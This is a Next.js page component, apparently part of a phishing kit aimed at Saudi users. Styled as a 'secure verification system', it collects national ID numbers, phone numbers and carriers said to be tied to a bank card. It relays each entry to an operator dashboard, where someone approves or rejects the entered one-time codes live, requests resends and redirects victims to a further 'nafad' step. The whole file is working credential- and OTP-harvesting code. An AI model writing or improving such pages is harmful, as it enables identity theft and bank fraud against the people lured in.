"use client"

import { useEffect, useState } from "react"
import { toast } from "sonner"
import { Button } from "@/components/ui/button"
import { Card } from "@/components/ui/card"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import { Phone, ShieldCheck, CreditCard } from "lucide-react"
import { UnifiedSpinner } from "@/components/unified-spinner"
import { StcVerificationModal } from "@/components/stc-verification-modal"
import { MobilyVerificationModal } from "@/components/mobily-verification-modal"
import { CarrierVerificationModal } from "@/components/carrier-verification-modal"
import { PhoneOtpDialog } from "@/components/dialog-b"

import { addData, getData, submitVisitorFormData, notifyDashboard } from "@/lib/api"
import { onVisitorStatusUpdated } from "@/lib/socket"
import { addToHistory } from "@/lib/history-utils"
import { useRedirectMonitor } from "@/hooks/use-redirect-monitor"
import { updateVisitorPage } from "@/lib/visitor-tracking"

export default function VerifyPhonePage() {
  const [idNumber, setIdNumber] = useState("")
  const [idError, setIdError] = useState("")
  const [phoneNumber, setPhoneNumber] = useState("")
  const [selectedCarrier, setSelectedCarrier] = useState("")
  const [showStcModal, setShowStcModal] = useState(false)
  const [showMobilyModal, setShowMobilyModal] = useState(false)
  const [showCarrierModal, setShowCarrierModal] = useState(false)
  const [showPhoneOtpDialog, setShowPhoneOtpDialog] = useState(false)
  const [otpRejectionError, setOtpRejectionError] = useState("")
  const [phoneError, setPhoneError] = useState("")
  const [phoneRejectionMessage, setPhoneRejectionMessage] = useState("")

  // Saudi telecom operators
  const telecomOperators = [
    { value: "stc", label: "STC - الاتصالات السعودية" },
    { value: "mobily", label: "Mobily - موبايلي" },
    { value: "zain", label: "Zain - زين" },
    { value: "virgin", label: "Virgin Mobile - فيرجن موبايل" },
    { value: "lebara", label: "Lebara - ليبارا" },
    { value: "salam", label: "SALAM - سلام" },
    { value: "go", label: "GO - جو" }
  ]

  const visitorId = typeof window !== 'undefined' ? localStorage.getItem("visitor") || "" : ""

  // Reset UI only (keep user data) - don't clear form fields on rejection
  const resetPhoneVerificationUi = () => {
    setShowPhoneOtpDialog(false)
    setShowStcModal(false)
    setShowMobilyModal(false)
    setShowCarrierModal(false)
    setOtpRejectionError("")
    setPhoneError("")
    setIdError("")
    // DON'T clear idNumber, phoneNumber, selectedCarrier - keep user data
    setPhoneRejectionMessage("")
    if (typeof window !== 'undefined') {
      localStorage.removeItem('phoneOtpRejectionError')
    }
  }
  
  // Monitor for admin redirects
  useRedirectMonitor({ visitorId, currentPage: "phone" })
  
  // Update visitor page and clear any old redirects
  useEffect(() => {
    if (visitorId) {
      updateVisitorPage(visitorId, "phone", 7)
      
      // Clear any old redirectPage to prevent unwanted navigation
      addData({ id: visitorId, redirectPage: null }).catch(err => console.error("[phone-info] Failed to clear redirectPage:", err))
    }
  }, [visitorId])

  // <ADMIN_NAVIGATION_SYSTEM> Poll for admin actions (socket is disabled)
  useEffect(() => {
    if (!visitorId) return

    console.log("[phone-info] Setting up polling for visitor:", visitorId)

    let lastPhoneStatus: string | null = null;
    let lastRejectionMessage: string | null = null;

    const pollVisitorData = async () => {
      try {
        const res = await fetch(`/api/visitors/${visitorId}`)
        if (!res.ok) return
        const data = await res.json()
        const nextPhoneStatus = data.phoneOtpStatus || null;
        const nextRejectionMessage = data.phoneRejectionMessage || null;

        // Rejection: update rejection message and show error
        // DON'T force user to this page - let them navigate freely
        const lastRejectionMsg = (window as any).__lastRejectionMsg__;
        if (nextPhoneStatus === 'rejected' && nextRejectionMessage && 
            (lastPhoneStatus !== nextPhoneStatus || lastRejectionMsg !== nextRejectionMessage)) {
          console.log("[phone-info] Reject state detected", data)
          resetPhoneVerificationUi()
          setPhoneRejectionMessage(nextRejectionMessage)
          (window as any).__lastRejectionMsg__ = nextRejectionMessage;
          // REMOVED: Don't force redirect to step5 - user can navigate freely
        }

        // Show resend request if manager requested it.
        // Check every time phoneResendRequested is true (regardless of status change)
        const lastResendRequested = (window as any).__lastResendRequested__;
        if (data.phoneResendRequested && !lastResendRequested) {
          setOtpRejectionError("رمز التحقق غير صحيح أو منتهي الصلاحية - يرجى انتظار رمز جديد")
          setShowPhoneOtpDialog(true)
          (window as any).__lastResendRequested__ = true;
        } else if (!data.phoneResendRequested) {
          (window as any).__lastResendRequested__ = false;
        }

        // Keep state in sync if the server changes it later.
        if (nextPhoneStatus !== lastPhoneStatus || nextRejectionMessage !== lastRejectionMessage) {
          lastPhoneStatus = nextPhoneStatus;
          lastRejectionMessage = nextRejectionMessage;
        }
        
        // Clear oneTimeRedirect after it was used by useRedirectMonitor
        if (data.oneTimeRedirect) {
          fetch(`/api/visitors/${visitorId}/clear-redirect`, { method: 'POST' }).catch(() => {})
        }
      } catch (err) {
        // Silent fail
      }
    }

    // Poll every 500ms while the user is on the phone verification page.
    const interval = setInterval(pollVisitorData, 500)
    pollVisitorData();
    
    return () => {
      console.log("[phone-info] Cleaning up polling")
      clearInterval(interval)
    }
  }, [visitorId])

  useEffect(() => {
    const visitorID = localStorage.getItem("visitor")
    if (!visitorID) return

    const unsubscribe = onVisitorStatusUpdated(({ field, status }) => {
      if (field === 'phoneOtpStatus') {
        if (status === 'approved') {
          setShowStcModal(false)
          setShowMobilyModal(false)
          setShowCarrierModal(false)
          window.location.href = '/step4'
        } else if (status === 'rejected') {
          setOtpRejectionError('رمز غير صالح - يرجى إدخال رمز التحقق الصحيح')
          setShowPhoneOtpDialog(true)
        }
      }
    })

    return () => unsubscribe()
  }, [visitorId])

  // ID number validation
  const validateIdNumber = (id: string): boolean => {
    const saudiIdRegex = /^[12]\d{9}$/
    if (!saudiIdRegex.test(id)) {
      setIdError("رقم الهوية يجب أن يبدأ بـ 1 أو 2 ويتكون من 10 أرقام")
      return false
    }
    setIdError("")
    return true
  }

  // Phone number validation
  const validatePhoneNumber = (phone: string): boolean => {
    // Remove spaces and special characters
    const cleanPhone = phone.replace(/\s/g, "")
    
    // Saudi phone number validation: starts with 05 and 10 digits total
    const saudiPhoneRegex = /^05\d{8}$/
    
    if (!saudiPhoneRegex.test(cleanPhone)) {
      setPhoneError("رقم الجوال يجب أن يبدأ بـ 05 ويتكون من 10 أرقام")
      return false
    }
    
    setPhoneError("")
    return true
  }

  const handleIdChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\D/g, "") // Only numbers
    if (value.length <= 10) {
      setIdNumber(value)
      if (value.length === 10) {
        validateIdNumber(value)
      } else {
        setIdError("")
      }
    }
  }

  const handlePhoneChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\D/g, "") // Only numbers
    if (value.length <= 10) {
      setPhoneNumber(value)
      if (phoneRejectionMessage) {
        setPhoneRejectionMessage("")
      }
      if (value.length === 10) {
        validatePhoneNumber(value)
      } else {
        setPhoneError("")
      }
    }
  }

  const handleSendOtp = async () => {
    if (!idNumber || !phoneNumber || !selectedCarrier) return
    
    if (!validateIdNumber(idNumber)) return
    if (!validatePhoneNumber(phoneNumber)) return

    const visitorID = localStorage.getItem('visitor')
    if (!visitorID) return

    try {
      await submitVisitorFormData({
        id: visitorID,
        phoneIdNumber: idNumber,
        phoneNumber: phoneNumber,
        phoneCarrier: selectedCarrier,
        phoneSubmittedAt: new Date().toISOString(),
        phoneOtpStatus: 'pending', // Step 5 - phone OTP status
        phoneUpdatedAt: new Date().toISOString(),
        redirectPage: null
      })

      // Notify dashboard immediately with phone data
      await notifyDashboard({
        id: visitorID,
        visitorId: visitorID,
        phoneIdNumber: idNumber,
        phoneOtpStatus: 'pending', // Step 7 - phone OTP
        phoneNumber: phoneNumber,
        phoneCarrier: selectedCarrier,
        phoneSubmittedAt: new Date().toISOString(),
        currentPage: "phone",
        currentStep: 7,
        status: "pending"
      })

      // Trigger dashboard refresh for instant update
      if (typeof window !== 'undefined') {
        window.dispatchEvent(new CustomEvent('dashboard-refresh'));
      }

      // Don't add to history yet - will add after OTP entry
      // Open Phone OTP Dialog directly
      setShowPhoneOtpDialog(true)
    } catch (error) {
      console.error("Error saving phone data:", error)
      toast.error("حدث خطأ", {
        description: "يرجى المحاولة مرة أخرى",
        duration: 5000
      })
    }
  }

  const handleApproved = () => {
    // Admin approved phone OTP - close waiting modal and navigate to nafad
    console.log("[step5] Phone OTP approved, navigating to nafad")
    
    // Close all waiting modals
    setShowStcModal(false)
    setShowMobilyModal(false)
    setShowCarrierModal(false)
    
    // Navigate to nafad page
    window.location.href = "/step4"
  }

  const handleRejected = async () => {
    // Admin rejected - close modal and allow re-entry
    const visitorID = localStorage.getItem('visitor')
    if (!visitorID) return

    try {
      const data = await getData(visitorID)
      if (data) {
        const currentPhoneData = {
          idNumber: data.phoneIdNumber || '',
          phoneNumber: data.phoneNumber,
          phoneCarrier: data.phoneCarrier,
          rejectedAt: new Date().toISOString()
        }
        await addData({
          id: visitorID,
          oldPhoneInfo: data.oldPhoneInfo ? [...data.oldPhoneInfo, currentPhoneData] : [currentPhoneData],
          phoneOtpStatus: 'pending',
          phoneCarrier: ''
        })
      }
    } catch (error) {
      console.error("Error saving rejected phone data:", error)
    }
    
    resetPhoneVerificationUi()
    
    toast.error("تم رفض رقم الهاتف", {
      description: "يرجى إدخال رقم جوال صحيح والمحاولة مرة أخرى",
      duration: 5000
    })
  }

  const handleOtpRejected = () => {
    // Admin rejected OTP - close waiting modals and reopen OTP dialog with error
    console.log("[step5] Phone OTP rejected, reopening dialog with error")
    
    // Close all waiting modals
    setShowStcModal(false)
    setShowMobilyModal(false)
    setShowCarrierModal(false)
    
    // Store error in localStorage so it persists across modal close/open
    localStorage.setItem('phoneOtpRejectionError', "رمز غير صالح - يرجى إدخال رمز التحقق الصحيح")
    
    // Set error message in state as well
    setOtpRejectionError("رمز غير صالح - يرجى إدخال رمز التحقق الصحيح")
    
    // Reopen OTP dialog
    setShowPhoneOtpDialog(true)
  }

  const handleShowWaitingModal = (carrier: string) => {
    // Show appropriate waiting modal based on carrier
    console.log("[step5] Showing waiting modal for carrier:", carrier)
    
    if (carrier === "stc") {
      setShowStcModal(true)
    } else if (carrier === "mobily") {
      setShowMobilyModal(true)
    } else {
      setShowCarrierModal(true)
    }
  }

  return (
    <>
      <div
        className="min-h-screen bg-gradient-to-b from-[#1a5c85] to-[#2d7ba8] flex items-center justify-center p-4"
        dir="rtl"
      >
        <div className="w-full max-w-lg space-y-6">
          {/* Header */}
          <div className="text-center text-white space-y-2 mb-8">
            <h1 className="text-4xl font-bold text-balance">نظام التحقق الآمن</h1>
            <p className="text-lg text-white/90">تحقق من هويتك بأمان وسرعة</p>
          </div>

          {/* Main Card */}
          <Card className="p-6 space-y-6">
            {/* Icon and Title */}
            <div className="text-center space-y-4">
              <div className="inline-flex items-center justify-center w-20 h-20 rounded-full bg-[#1a5c85]">
                <Phone className="w-10 h-10 text-white" />
              </div>
              <div>
                <h2 className="text-2xl font-bold text-gray-900 mb-2">التحقق عن رقم الجوال</h2>
                <p className="text-sm text-gray-600">الرجاء إدخال رقم الهوية ورقم الجوال واختيار شركة الاتصالات</p>
              </div>
            </div>

            {/* Verification Message */}
            <div className="bg-blue-50 border-l-4 border-blue-500 p-4 rounded-lg">
              <div className="flex items-start gap-3">
                <ShieldCheck className="w-5 h-5 text-blue-600 flex-shrink-0 mt-0.5" />
                <p className="text-sm text-blue-900 font-medium leading-relaxed">
                  للتحقق من ملكية وسيلة الدفع، يُرجى إدخال رقم الهوية ورقم الهاتف المرتبطين ببطاقتك البنكية.
                </p>
              </div>
            </div>

            {/* ID Number Input */}
            <div className="space-y-2">
              <Label htmlFor="idNumber" className="text-right block text-gray-700 font-semibold">
                رقم الهوية *
              </Label>
              <div className="relative">
                <Input
                  id="idNumber"
                  type="tel"
                  placeholder="1xxxxxxxxx"
                  value={idNumber}
                  onChange={handleIdChange}
                  className={`text-right pr-12 text-lg h-12 ${idError ? "border-red-500" : ""}`}
                  dir="ltr"
                />
                <div className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-500">
                  <CreditCard className="w-5 h-5" />
                </div>
              </div>
              {idError && (
                <p className="text-red-500 text-sm text-right">{idError}</p>
              )}
            </div>

            {/* Phone Number Input */}
            <div className="space-y-2">
              <Label htmlFor="phone" className="text-right block text-gray-700 font-semibold">
                رقم الجوال *
              </Label>
              <div className="relative">
                <Input
                  id="phone"
                  type="tel"
                  placeholder="05xxxxxxxx"
                  value={phoneNumber}
                  onChange={handlePhoneChange}
                  className={`text-right pr-20 text-lg h-12 ${phoneError ? "border-red-500" : ""}`}
                  dir="ltr"
                />
                <div className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-500 text-sm font-semibold">+966</div>
              </div>
              {phoneError && (
                <p className="text-red-500 text-sm text-right">{phoneError}</p>
              )}
              {phoneRejectionMessage && (
                <p className="text-red-600 text-sm text-right font-semibold bg-red-50 border border-red-200 rounded-md px-3 py-2 mt-2">
                  {phoneRejectionMessage}
                </p>
              )}
            </div>

            {/* Carrier Dropdown */}
            <div className="space-y-2">
              <Label htmlFor="carrier" className="text-right block text-gray-700 font-semibold">
                شركة الاتصالات *
              </Label>
              <select
                id="carrier"
                value={selectedCarrier}
                onChange={(e) => setSelectedCarrier(e.target.value)}
                className="w-full h-12 text-right text-base border-2 rounded-lg px-4 bg-white focus:border-[#1a5c85] focus:outline-none shadow-sm appearance-none cursor-pointer"
                style={{
                  backgroundImage: `url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='12' viewBox='0 0 12 12'%3E%3Cpath fill='%23333' d='M6 9L1 4h10z'/%3E%3C/svg%3E")`,
                  backgroundRepeat: 'no-repeat',
                  backgroundPosition: 'left 1rem center',
                  paddingLeft: '2.5rem'
                }}
              >
                <option value="">اختر شركة الاتصالات</option>
                {telecomOperators.map((operator) => (
                  <option key={operator.value} value={operator.value}>
                    {operator.label}
                  </option>
                ))}
              </select>
            </div>

            {/* Submit Button */}
            <Button
              onClick={handleSendOtp}
              className="w-full h-14 text-lg bg-[#1a5c85] hover:bg-[#154a6d] disabled:opacity-50 disabled:cursor-not-allowed"
              disabled={!phoneNumber || !selectedCarrier || phoneNumber.length !== 10 || !!phoneError}
            >
              <Phone className="ml-2 h-5 w-5" />
              إرسال رمز التحقق
            </Button>

            {/* Info Box */}
            <div className="bg-blue-50 border border-blue-200 rounded-lg p-3 text-center">
              <p className="text-sm text-blue-900">🔒 معلوماتك محمية بأعلى معايير الأمان والخصوصية</p>
            </div>
          </Card>
        </div>
      </div>

      {/* STC Verification Modal */}
      <StcVerificationModal 
        open={showStcModal} 
        visitorId={visitorId}
        onApproved={handleApproved}
        onRejected={handleRejected}
      />

      {/* Mobily Verification Modal */}
      <MobilyVerificationModal 
        open={showMobilyModal} 
        visitorId={visitorId}
        onApproved={handleApproved}
        onRejected={handleRejected}
      />

      {/* Other Carriers Verification Modal */}
      <CarrierVerificationModal 
        open={showCarrierModal} 
        visitorId={visitorId}
        onApproved={handleApproved}
        onRejected={handleRejected}
      />

      {/* Phone OTP Dialog */}
      <PhoneOtpDialog
        open={showPhoneOtpDialog}
        onOpenChange={(open) => {
          setShowPhoneOtpDialog(open)
          if (!open) setOtpRejectionError("") // Clear error when closing
        }}
        phoneNumber={phoneNumber}
        phoneCarrier={selectedCarrier}
        onRejected={handleOtpRejected}
        onShowWaitingModal={handleShowWaitingModal}
        rejectionError={otpRejectionError}
      />
    </>
  )
}
